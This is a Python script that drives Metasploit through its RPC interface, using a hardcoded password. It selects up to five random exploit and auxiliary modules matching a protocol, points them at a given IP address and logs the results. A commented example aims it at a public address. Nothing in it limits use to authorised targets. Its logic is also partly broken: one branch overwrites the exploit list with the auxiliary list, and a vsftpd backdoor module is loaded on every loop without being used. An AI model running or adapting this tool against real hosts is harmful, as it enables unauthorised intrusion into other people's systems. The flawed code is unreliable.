from pymetasploit3.msfrpc import MsfRpcClient
import re
import sys
import random

def deviceTest(Protocol,IP,filepath):
    client=MsfRpcClient('chinazfz')
    #exploit1 = client.modules.use('exploit','unix/ftp/vsftpd_234_backdoor')
    SelectModel_exploit=[]
    SelectModel_aux=[]
    count=0
    for i in client.modules.exploits:
        if(re.search(Protocol,i)):
            SelectModel_exploit.append(i)
    for i in client.modules.auxiliary:
        if(re.search(Protocol,i)):
            SelectModel_aux.append(i)
    Run_exploit=[]
    if(len(SelectModel_exploit)>5):
        Run_exploit=random.sample(SelectModel_exploit,5)
    else:
        Run_exploit=SelectModel_exploit
    Run_aux=[]
    if(len(SelectModel_aux)>5):
        Run_aux=random.sample(SelectModel_aux,5)
    else:
        Run_exploit=SelectModel_aux
    for module in Run_exploit:
        print(module)
        exploit1=client.modules.use('exploit','unix/ftp/vsftpd_234_backdoor')
        exploit=client.modules.use('exploit',module)
        require=''
        for temp in exploit.missing_required:
            if re.search('HOST', temp):
                require = temp
                exploit[require] = IP
        try:
            cid = client.consoles.console().cid
            result = client.consoles.console(cid).run_module_with_output(exploit)
            path = filepath + "_" + str(count) + ".txt"
            count = count + 1
            with open(path, 'w') as f:
                writeline = "{\"ip\":\"" + IP + "\"," + "\"vendor\":\"" + Protocol+ "\"," + "\"module\":\"" + \
                            "exploit/"+module + "\"," + "\"result\":\"" + result + "\"}\n"
                f.write(writeline)
                f.close()
            print(result)
        except Exception as e:
            print(e)
    for module in Run_aux:
        exploit=client.modules.use('auxiliary',module)
        require=''
        for temp in exploit.missing_required:
            if re.search('HOST', temp):
                require = temp
                exploit[require] = IP
        try:
            cid = client.consoles.console().cid
            result = client.consoles.console(cid).run_module_with_output(exploit)
            path = filepath + "_" + str(count) + ".txt"
            count = count + 1
            with open(path, 'w') as f:
                writeline = "{\"ip\":\"" + IP + "\"," + "\"vendor\":\"" + Protocol+ "\"," + "\"module\":\"" + \
                            "auxiliary/"+module + "\"," + "\"result\":\"" + result + "\"}\n"
                f.write(writeline)
                f.close()
            print(result)
        except Exception as e:
            print(e)
if __name__=='__main__':
    if len(sys.argv)>1:
        deviceTest(sys.argv[1],sys.argv[2],sys.argv[3])
#     deviceTest("http","69.225.207.90","./Metasploit/http")